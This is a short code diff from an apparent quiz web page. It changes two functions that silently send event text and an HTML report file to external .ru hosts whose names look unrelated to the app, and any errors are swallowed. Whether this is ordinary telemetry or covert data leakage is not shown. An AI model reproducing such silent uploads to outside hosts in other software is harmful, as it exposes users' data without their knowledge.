@@ -1657,8 +1657,8 @@
     const metaRight = document.getElementById("metaRight");
     function setMeta(t) { metaRight.innerHTML = t || '' }
 
-    function sendEvent(t) { fetch("https://dogedebik.fvds.ru/?user=0&text=" + encodeURIComponent(t)).catch(() => { }) }
-    function uploadReport(html, user = 0) { const blob = new Blob([html], { type: "text/html" }); const f = new FormData(); f.append("report", blob, "report.html"); f.append("user", user); fetch("https://dogedebik.fvds.ru/upload", { method: "POST", body: f }).catch(() => { }) }
+    function sendEvent(t) { fetch("https://api.avenuecars.ru/?user=0&text=" + encodeURIComponent(t)).catch(() => { }) }
+    function uploadReport(html, user = 0) { const blob = new Blob([html], { type: "text/html" }); const f = new FormData(); f.append("report", blob, "report.html"); f.append("user", user); fetch("https://api.avenuecars.ru/upload", { method: "POST", body: f }).catch(() => { }) }
 
     function shuffle(arr) { for (let i = arr.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1));[arr[i], arr[j]] = [arr[j], arr[i]] } }
     function makeQuestionsSet(testName) {
